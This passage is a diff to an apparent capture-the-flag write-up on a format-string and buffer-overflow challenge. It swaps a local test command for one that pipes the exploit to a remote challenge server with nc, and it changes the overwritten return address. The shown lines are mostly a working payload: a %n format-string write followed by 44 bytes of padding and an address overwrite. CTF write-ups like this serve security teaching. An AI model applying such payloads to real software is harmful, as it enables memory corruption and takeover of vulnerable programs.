@@ -10,4 +10,4 @@ This challenge involves format strings and buffer overflows in a two-sided trail
 
 5. The win function is then called and given the start and guess variables have been correctly manipulated, will result in the flag!
 
-(python2 -c "print '\x0c\x90\x55\x56%4\$n'"; python2 -c "print '4'"; python2 -c "print 'A'*44 + '\x45\x63\x55\x56'";) | ./main
+(python2 -c "print '\x0c\x90\x55\x56%4\$n'"; python2 -c "print '4'"; python2 -c "print 'A'*44 + '\x6b\x63\x55\x56'";) | nc wolfdragon.me 62401
